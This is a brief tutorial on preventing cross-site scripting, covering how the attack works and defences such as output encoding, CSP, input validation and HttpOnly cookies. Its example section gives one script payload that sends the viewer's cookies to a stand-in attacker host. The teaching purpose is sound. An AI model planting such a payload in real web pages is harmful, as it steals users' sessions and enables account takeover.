# XSS Attack Prevention
## Core Concept
Cross-Site Scripting (XSS) is an attack where an attacker injects malicious JavaScript into web pages viewed by other users. It can steal cookies, hijack accounts, or redirect users to malicious sites.

## Why It Matters
XSS is one of the most common web vulnerabilities. It affects any application that displays user-generated content, making prevention critical for all web developers.

## How It Works (Theory)
1. An attacker inputs malicious script code into a form, comment, or URL parameter.
2. The server stores the input without proper sanitization or escaping.
3. When another user views the page, the browser executes the malicious script in their session.

## Practical Example
Malicious input:
`<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`
When rendered without escaping, this script runs and sends the user's session cookie to the attacker.

## How to Defend / Secure
1. **Output Encoding**: Escape HTML special characters (`< > " ' &`) when rendering user input.
2. **Content Security Policy (CSP)**: Block unauthorized script execution with strict CSP headers.
3. **Input Validation**: Reject or sanitize untrusted input before storage.
4. **HttpOnly Cookies**: Mark cookies as HttpOnly to prevent theft via JavaScript.

## Key Takeaways
1. XSS = injecting malicious scripts into other users' browsers.
2. Output encoding is the primary defense against XSS.
3. CSP provides a strong second layer of protection.
